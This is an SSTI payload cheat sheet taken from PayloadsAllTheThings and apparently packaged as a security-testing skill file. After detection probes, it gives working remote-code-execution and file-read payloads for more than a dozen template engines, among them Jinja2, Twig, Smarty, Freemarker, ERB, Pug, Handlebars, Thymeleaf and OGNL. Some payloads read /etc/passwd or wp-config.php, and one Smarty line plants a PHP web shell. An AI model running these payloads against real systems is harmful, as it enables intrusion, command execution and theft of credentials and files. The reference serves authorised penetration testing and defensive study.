---
description: Universal probe, error fingerprint, and per-engine sandbox escapes and RCE gadgets (Jinja2, Twig, Pug, Freemarker, ERB, etc.)
skill: ssti-testing
source: PayloadsAllTheThings — Server Side Template Injection
source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
source_license: MIT; see THIRD_PARTY_NOTICES.md
---

# Server-Side Template Injection (SSTI) Payloads

> Source: PayloadsAllTheThings — Server Side Template Injection

## Detection — Universal Probe

```
${{<%[%'"}}%\.
```

### Error-Based Engine Fingerprinting

```
(1/0).zxy.zxy
```

- `ZeroDivisionError` -> Python (Jinja2/Mako)
- `java.lang.ArithmeticException` -> Java (Freemarker/Velocity)
- `ReferenceError` / `TypeError` -> Node.js (Pug/Nunjucks)

## Jinja2 (Python)

### RCE

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__["os"].popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

### RCE Without Direct Builtins

```python
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{x()._module.__builtins__['__import__']('os').popen(request.args.cmd).read()}}
  {%endif%}
{%endfor%}
```

### File Read

```python
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[X]('/etc/passwd').read() }}
# Note: [1] for Python 3 (object), [2] for Python 2. Subclass index X varies by environment —
# enumerate with {{''.__class__.__mro__[1].__subclasses__()}} and find a file-reading class.
```

## Mako (Python)

### RCE

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

```python
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
```

## Twig (PHP)

### RCE

```php
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
{{['cat /etc/passwd']|filter('system')}}
```

### File Read

```php
{{include("wp-config.php")}}
{{'/etc/passwd'|file_excerpt(1,30)}}
```

## Smarty (PHP)

### Detection

```php
{$smarty.version}
```

### RCE

```php
{system('id')}
{system('cat /etc/passwd')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

## Freemarker (Java)

### RCE

```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

### File Read

```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

## Velocity (Java)

### RCE

```
# Requires VelocityTools (ClassTool) — not available in vanilla Velocity
#set($str=$class.inspect("java.lang.String").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$chr.toChars($out.read())#end
```

## ERB (Ruby)

### RCE

```ruby
<%= `id` %>
<%= system('cat /etc/passwd') %>
<%= IO.popen('ls /').readlines() %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
```

## Pug / Jade (Node.js)

### RCE

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
#{root.process.mainModule.require('child_process').execSync('id')}
```

## Handlebars (Node.js)

### RCE (< 4.7.7)

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## Pebble (Java)

### RCE

```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream %}
{{ (1).TYPE.forName('java.io.BufferedReader')
     .getDeclaredConstructor((1).TYPE.forName('java.io.Reader'))
     .newInstance((1).TYPE.forName('java.io.InputStreamReader')
       .getDeclaredConstructor((1).TYPE.forName('java.io.InputStream'))
       .newInstance(bytes))
     .readLine() }}
```

## Thymeleaf (Java / Spring)

### Detection

```
__${7*7}__::x
${T(java.lang.Runtime).getRuntime().exec('id')}
```

### RCE via Expression Preprocessing

```
# URL path-based (Spring view name injection)
GET /path/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

# Fragment expression
~{::__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__}
```

### RCE via SpEL in Attributes

```html
<div th:with="${T(java.lang.Runtime).getRuntime().exec('id')}"/>
```

## Expression Language Injection

### Spring SpEL

```
#{7*7}
#{T(java.lang.Runtime).getRuntime().exec('id')}
```

### OGNL (Struts)

```
%{7*7}
%{#cmd='id',#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')),#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd}),#p=new java.lang.ProcessBuilder(#cmds),#p.redirectErrorStream(true),#process=#p.start()}
```

Test in any parameter processed by expression evaluators — form fields, headers, URL path segments.
